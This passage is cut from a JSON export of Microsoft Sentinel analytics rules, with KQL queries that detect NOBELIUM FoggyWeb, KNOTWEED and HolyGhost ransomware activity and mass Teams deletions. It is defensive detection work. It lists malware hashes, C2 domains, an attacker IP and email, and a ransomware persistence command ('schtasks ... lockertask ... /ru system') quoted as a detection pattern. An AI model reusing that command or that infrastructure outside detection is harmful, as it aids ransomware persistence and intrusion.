Source), Account = UserName, FileHash = SHA256, Image = EventDetail.[4].[\"#text\"] \n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated,  Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceEvents\n| where DeviceName in (ADFS_Servers)\n| extend FilePath = strcat(FolderPath, '\\\\', FileName)\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or FilePath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceFileEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceImageLoadEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where Computer in (ADFS_Servers)\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| where EventDetail has_any (sha256Hashes) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256\n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256, Image = EventDetail.[4].[\"#text\"] \n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(W3CIISLog \n| where ( csMethod == 'GET' and csUriStem has_any (GET_URI)) or (csMethod == 'POST' and csUriStem has_any (POST_URI))\n| summarize StartTime = max(TimeGenerated), EndTime = min(TimeGenerated), cIP_MethodCount = count() \nby cIP, cIP_MethodCountType = \"Count of repeated entries, this is to reduce rowsets returned\", csMethod, \ncsHost, scStatus, sIP, csUriStem, csUriQuery, csUserName, csUserAgent, csCookie, csReferer\n| extend timestamp = StartTime, IPCustomEntity = cIP, HostCustomEntity = csHost, AccountCustomEntity = csUserName\n),\n(imFileEvent\n| where DvcHostname in (ADFS_Servers)\n| where TargetFileSHA256 has_any (sha256Hashes) or FilePath has_any (FilePaths)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"AlgorithmCustomEntity"},{"identifier":"Value","columnName":"FileHashCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ProcessCustomEntity"}]}],"templateVersion":"2.1.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Collection","DefenseEvasion","Exfiltration","Discovery","PrivilegeEscalation","Persistence","Execution","CredentialAccess","LateralMovement"],"techniques":["T1071","T1573","T1105","T1560","T1005","T1140","T1574","T1036","T1027","T1620","T1550","T1041","T1083","T1057","T1106","T1129","T1040","T1552"],"displayName":"NOBELIUM IOCs related to FoggyWeb backdoor","enabled":true,"description":"Identifies a match across various data feeds for IOCs related to FoggyWeb backdoor by the threat actor NOBELIUM.\n FoggyWeb is a passive and highly targeted backdoor capable of remotely exfiltrating sensitive information from a compromised AD FS server.\n It can also receive additional malicious components from a command-and-control (C2) server and execute them on the compromised server.\n Reference: https://aka.ms/nobelium-foggy-web\n\nPersistence, Credential Access, Collection, Command and Control, Exfiltration, Defense Evasion, Discovery, Lateral Movement\n\nT1071: Application Layer Protocol:T1071.001, \nT1560:Archive Collected Data:T1560.002, T1560.003\nT1005:Data from Local System\nT1140:Deobfuscate/Decode Files or Information\nT1573:Encrypted Channel:T1573.001\nT1041:Exfiltration Over C2 Channel\nT1083:File and Directory Discovery.\nT1574:Hijack Execution Flow:T1574.001\nT1105:Ingress Tool Transfer\nT1036:Masquerading: T1036.005\nT1106:Native API\nT1040:Network Sniffing\nT1027:Obfuscated Files or Information;T1027.004\nT1057:Process Discovery\nT1620:Reflective Code Loading\nT1129:Shared Modules\nT1552: Unsecured Credentials: T1552.004\nT1550:Use Alternate Authentication Material\n\nPLATFORM:Microsoft 365\nMITRE:TA0005;T1550;T1550.001;T1550.004","alertRuleTemplateName":"c37711a4-5f44-4472-8afc-0679bc0ef966","lastModifiedUtc":"2024-10-02T21:36:07.7343736Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bef13cf3-acb0-46b4-8f24-74f6a19d0b81","name":"bef13cf3-acb0-46b4-8f24-74f6a19d0b81","etag":"\"0e0132a8-0000-2700-0000-62f506d80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let knotweed_sigs = dynamic([\"JumplumpDropper\", \"Jumplump\", \"Corelump\", \"Medcerc\", \"SuspModuleLoad\", \"Mexlib\"]);\n  let mde_data = (DeviceInfo\n    | extend DeviceName = tolower(DeviceName)\n    | join kind=rightouter ( SecurityAlert\n    | where ProviderName =~ \"MDATP\"\n    | extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n    | extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n    | where ThreatFamilyName in~ (knotweed_sigs)\n    | extend CompromisedEntity = tolower(CompromisedEntity)\n    ) on $left.DeviceName == $right.CompromisedEntity);\n  let event_data = ( Event\n    | where EventID in (1006, 1009, 1116, 1119)\n    | extend ThreatData = parse_json(tostring(parse_json(tostring(parse_json(tostring(parse_xml(EventData).DataItem)).EventData)).Data))\n    | mv-expand ThreatData\n    | where tostring(ThreatData.[\"@Name\"]) == \"Threat Name\"\n    | extend EventData = parse_xml(EventData)\n    | where tostring(ThreatData.[\"#text\"]) has_any (knotweed_sigs));\n  union mde_data, event_data\n  | extend ThreatName = iif(isnotempty(ThreatName), ThreatName, tostring(ThreatData.[\"#text\"]))\n  | extend ThreatFamilyName = iif(isnotempty(ThreatFamilyName), ThreatFamilyName, split(tostring(ThreatData.[\"#text\"]), \"/\")[-1])\n  | extend TimeGenerated = iif(isnotempty(TimeGenerated), TimeGenerated, TimeGenerated1)\n  | extend DeviceName = iif(isnotempty(DeviceName), DeviceName, Computer)\n  | project-reorder TimeGenerated, CompromisedEntity, ThreatName, ThreatFamilyName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"templateVersion":"1.0.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1203"],"displayName":"KNOTWEED AV Detection","enabled":false,"description":"This query looks for Microsoft Defender AV detections related to the KNOTWEED threat actor and the Corelump and Jumplump malware.\n  Ref: https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/","alertRuleTemplateName":"9f9c1e51-4fb1-4510-a675-c7c2fb32f47e","lastModifiedUtc":"2022-08-11T13:40:40.8729099Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/449f9957-c066-4025-87d6-aeb843a91c10","name":"449f9957-c066-4025-87d6-aeb843a91c10","etag":"\"080030a8-0000-2700-0000-646506170000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let sha256Hashes = dynamic([\"78c255a98003a101fa5ba3f49c50c6922b52ede601edac5db036ab72efc57629\", \"0588f61dc7e4b24554cffe4ea56d043d8f6139d2569bc180d4a77cf75b68792f\", \"441a3810b9e89bae12eea285a63f92e98181e9fb9efd6c57ef6d265435484964\", \"cbae79f66f724e0fe1705d6b5db3cc8a4e89f6bdf4c37004aa1d45eeab26e84b\", \"fd6515a71530b8329e2c0104d0866c5c6f87546d4b44cc17bbb03e64663b11fc\", \"5d169e083faa73f2920c8593fb95f599dad93d34a6aa2b0f794be978e44c8206\", \"7f29b69eb1af1cc6c1998bad980640bfe779525fd5bb775bc36a0ce3789a8bfc\", \"02a59fe2c94151a08d75a692b550e66a8738eb47f0001234c600b562bf8c227d\", \"7f84bf6a016ca15e654fb5ebc36fd7407cb32c69a0335a32bfc36cb91e36184d\", \"afab2e77dc14831f1719e746042063a8ec107de0e9730249d5681d07f598e5ec\", \"894138dfeee756e366c65a197b4dbef8816406bc32697fac6621601debe17d53\", \"4611340fdade4e36f074f75294194b64dcf2ec0db00f3d958956b4b0d6586431\", \"c96ae21b4cf2e28eec222cfe6ca903c4767a068630a73eca58424f9a975c6b7d\", \"fa30be45c5c5a8f679b42ae85410f6099f66fe2b38eb7aa460bcc022babb41ca\", \"e64bea4032cf2694e85ede1745811e7585d3580821a00ae1b9123bb3d2d442d6\"]);\n(union isfuzzy=true\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, FileHashCustomEntity = 'SHA256', Account = SourceUserID\n),\n(imFileEvent\n| where TargetFileSHA256 has_any (sha256Hashes)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(Event\n| where Source =~ \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"], Hashes = tostring(EventDetail.[17].[\"#text\"])\n| extend Hashes = extract_all(@\"(?P<key>\\w+)=(?P<value>[a-zA-Z0-9]+)\", dynamic([\"key\",\"value\"]), Hashes)\n| extend Hashes = column_ifexists(\"Hashes\", \"\"), CommandLine = column_ifexists(\"CommandLine\", \"\")\n| extend Hashes = todynamic(Hashes) | mv-expand Hashes\n| where (Hashes[0] =~ \"SHA256\" and Hashes[1] has_any (sha256Hashes)) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, Hashes, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), FileHashCustomEntity = tostring(Hashes[1])\n),\n(DeviceEvents\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceFileEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n),\n(DeviceImageLoadEvents\n| where SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileHashCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ProcessCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1203"],"displayName":"KNOTWEED File Hashes July 2022","enabled":false,"description":"This query looks for references to known KNOTWEED file hashes in various logs.\n  This query was published July 2022.\n  Ref: https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/","alertRuleTemplateName":"a779e2d5-9109-4f0a-a75e-f3d4f3c58560","lastModifiedUtc":"2023-05-17T16:51:35.652657Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/36120b15-66bd-4ad3-8827-59e48d9ea7f0","name":"36120b15-66bd-4ad3-8827-59e48d9ea7f0","etag":"\"870080db-0000-2700-0000-66fdca3a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Rob Russell\r\n//Description:\r\n// Updated 11/15 Changed EmailEvents_CL to EmailEvents\r\n// Looks for IOCs and behavior related to HolyGhost ransomware\r\n// This analytic combines MS created analytics from the following locations and is adjusted for the CSSP environments\r\n// Since the IOC list is relatively small it has been hardcoded into the analytic.\r\n// https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0530_FileExtRename.yaml\r\n// https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0530_July2022.yaml\r\n// More details about the HolyGhost ransomware can be found here:\r\n// https://www.microsoft.com/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/\r\n// https://www.bleepingcomputer.com/news/security/microsoft-links-holy-ghost-ransomware-operation-to-north-korean-hackers/\r\n//False Positives: Could be normal administrative activity, however all the behavior delectated in this analytic should be investigated.\r\nlet iocs = datatable(DateAdded:string,IoC:string,Type:string) [\r\n\"7/14/2022\",\"99fc54786a72f32fd44c7391c2171ca31e72ca52725c68e2dde94d04c286fccd\",\"sha256\",\r\n\"7/14/2022\",\"f8fc2445a9814ca8cf48a979bff7f182d6538f4d1ff438cf259268e8b4b76f86\",\"sha256\",\r\n\"7/14/2022\",\"bea866b327a2dc2aa104b7ad7307008919c06620771ec3715a059e675d9f40af\",\"sha256\",\r\n\"7/14/2022\",\"193.56.29.23\",\"IP\",\r\n\"7/14/2022\",\"H0lyGh0st@mail2tor[.]com\",\"Email\",\r\n\"7/14/2022\",@\"C:\\FOR_DECRYPT.html\",\"FilePath\",\r\n\"7/14/2022\",@\"cmd.exe /Q /c schtasks /create /tn lockertask /tr [File] /sc minute /mo 1 /F /ru system 1> \\\\127.0.0.1\\ADMIN$\\__[randomnumber] 2>&1\",\"CommandLine\"];\r\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\r\nlet IPList = (iocs | where Type =~ \"ip\"| project IoC);\r\n(union isfuzzy=true \r\n(DeviceProcessEvents\r\n| where InitiatingProcessSHA256 in (sha256Hashes) or SHA256 in (sha256Hashes) or ( InitiatingProcessCommandLine has ('cmd.exe /Q /c schtasks /create /tn lockertask /tr') \r\nand InitiatingProcessCommandLine has ('sc minute /mo 1 /F /ru system'))\r\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, AccountName, SHA256\r\n| extend Account = AccountName, Computer = DeviceName,  CommandLine = InitiatingProcessCommandLine, FileHash = case(InitiatingProcessSHA256 in (sha256Hashes), \"InitiatingProcessSHA256\", SHA256 in (sha256Hashes), \"SHA256\", \"No Match\")\r\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, FileHashCustomEntity = case(FileHash == \"InitiatingProcessSHA256\", InitiatingProcessSHA256, FileHash == \"SHA256\", SHA256, \"No Match\")\r\n),\r\n(DeviceFileEvents\r\n| where SHA256 has_any (sha256Hashes)\r\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\r\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  CommandLine = InitiatingProcessCommandLine,Image = InitiatingProcessFolderPath\r\n),\r\n(EmailEvents\r\n| where SenderFromAddress == 'H0lyGh0st@mail2tor.com'\r\n| extend timestamp = TimeGenerated, IPCustomEntity = SenderIPv4, AccountCustomEntity = SenderFromAddress\r\n),\r\n(OfficeActivity \r\n|extend SourceIPAddress = ClientIP, Account = UserId \r\n| where  SourceIPAddress in (IPList) \r\n| extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account \r\n),\r\n(SigninLogs \r\n| where isnotempty(IPAddress) \r\n| where IPAddress in (IPList) \r\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress \r\n), \r\n(AzureActivity  \r\n| where isnotempty(CallerIpAddress) \r\n| where CallerIpAddress in (IPList) \r\n| extend timestamp = TimeGenerated, IPCustomEntity = CallerIpAddress, AccountCustomEntity = Caller \r\n), \r\n( \r\nDeviceNetworkEvents \r\n| where isnotempty(RemoteIP)  \r\n| where RemoteIP in (IPList)  \r\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName  \r\n),\r\n(\r\n DeviceFileEvents\r\n| where ActionType == \"FileCreated\"\r\n| where FileName endswith \".h0lyenc\" or FolderPath == \"C:\\\\FOR_DECRYPT.html\" \r\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by AccountCustomEntity = iff(isnotempty(InitiatingProcessAccountUpn), InitiatingProcessAccountUpn, InitiatingProcessAccountName), HostCustomEntity = DeviceName, Type, InitiatingProcessId, FileName, FolderPath, EventType = ActionType, Commandline = InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessSHA256, FileHashCustomEntity = SHA256\r\n)\r\n)\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"FileHashCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution","Persistence","PrivilegeEscalation","DefenseEvasion","CredentialAccess","Discovery","Collection","CommandAndControl","Impact"],"techniques":["T1190","T1133","T1059","T1134","T1027","T1056","T1012","T1033","T1057","T1049","T1082","T1083","T1135","T1114","T1571","T1573","T1486"],"displayName":"BAH_HolyGhost","enabled":true,"description":"This query aims to detect and respond to various stages of a ransomware attack involving HolyGhost ransomware, including initial access, execution, data encryption, and data destruction. It also focuses on the specific indicators of compromise associated with HolyGhost ransomware.\nPLATFORM:Windows\nMITRE:TA0002;T1059","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:33:29.3455966Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a63bd61e-9b04-496d-9cf2-1df45eb76601","name":"a63bd61e-9b04-496d-9cf2-1df45eb76601","etag":"\"87004fc3-0000-2700-0000-66fdc8720000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Title: BAH_MultipleTeamsDeletedBySingleUser\n//Description: This analytic looks for attempts where multiple teams are deleted by a single user. This is typically unusual behavior that is worth investigating further into for any intrusion attacks/attempts.\n//Author: Steven Wan\n//False Positives: Possible if the threshold for uncommon activity/actions is exceeded. UEBA table is being leveraged here to determine if the activity for multiple Teams being deleted at a time is highly unregular and unusual activity that must be investigated further into with the current threshold set at 5.\n\n// Adjust this value to change how many Teams should be deleted before including\nlet min_delete_count = 5;\nlet BA = (BehaviorAnalytics\n| evaluate bag_unpack(UsersInsights, columnsConflict=\"replace_source\")\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\n| extend UserId = tostring(UserPrincipalName)\n| where InvestigationPriority >= 4//adjust threshold\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\",\"\")\n| where ActionUncommonlyPerformedByUser == \"True\"\n| extend AccountObjectID = column_ifexists(\"AccountObjectID\",\"\")\n| extend AccountDomain = column_ifexists(\"AccountDomain\",\"\")\n| extend OnPremisesSID = column_ifexists(\"AccountObjectID\",\"\")\n| extend Resource = column_ifexists(\"Resource\",\"\")\n| extend App = column_ifexists(\"App\",\"\")\n| project-away AccountObjectID,ActionType,ActivityType,TimeProcessed, UserPrincipalName,UserName,EventSource,DevicesInsights,Type,AccountDomain, OnPremisesSID,Resource,App,TenantId,SourceRecordId);\nOfficeActivity\n| where OfficeWorkload =~ \"MicrosoftTeams\" \n| where Operation =~ \"TeamDeleted\"\n| where UserId !has \"Microsoft Teams Sync\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), DeletedTeams = make_set(TeamName) by UserId\n| where array_length(DeletedTeams) > min_delete_count\n| extend timestamp = StartTime, AccountCustomEntity = UserId\n| join kind=inner (BA) on $left.UserId==$right.UserId","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485","T1489"],"displayName":"BAH_MultipleTeamsDeletedBySingleUser","enabled":true,"description":"This detection flags the occurrences of deleting multiple teams within an hour.\nThis data is a part of Office 365 Connector in Microsoft Sentinel.\nPLATFORM:Windows,IaaS\nMITRE:TA0040;T1485;T1489","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:25:33.260009Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bf32bb9b-60f1-4703-a320-4791f4509f12","name":"bf32bb9b-60f1-4703-a320-4791f4509f12","etag":"\"8700fbcf-0000-2700-0000-66fdc9620000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\n// Description:\n// Updated 10/3: Removed curl analytic and added AAD lookup where applicable\n// ATT&CK Techniques, Initial Access T1566, Execution T1204, Persistence T1546, Privilege Escalation T1546\n// This analytic is based on KNOTWEED analytics listed here\n// https://github.com/Azure/Azure-Sentinel/tree/master/Hunting%20Queries/Microsoft%20365%20Defender/Campaigns/KNOTWEED\n// MS article with more background here\n// https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/\n// KNOTWEED uses curl and public file shares to download 2nd stage tools/malware.\n// False Positives: Almost all sections of this analytic make use of static IOCs except for file activity in the \"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\" directory. This may produce a false positive.\nlet c2domains = dynamic([\"acrobatrelay.com\", \"finconsult.cc\", \"realmetaldns.com\"]);\nlet hashes = dynamic([ \n    \"78c255a98003a101fa5ba3f49c50c6922b52ede601edac5db036ab72efc57629\", // SHA-256 Malicious Excel document and VBA  \n    \"0588f61dc7e4b24554cffe4ea56d043d8f6139d2569bc180d4a77cf75b68792f\", // SHA-256 Malicious Excel document and VBA  \n    \"441a3810b9e89bae12eea285a63f92e98181e9fb9efd6c57ef6d265435484964\", // SHA-256 Jumplump malware  \n    \"cbae79f66f724e0fe1705d6b5db3cc8a4e89f6bdf4c37004aa1d45eeab26e84b\", // SHA-256 Jumplump 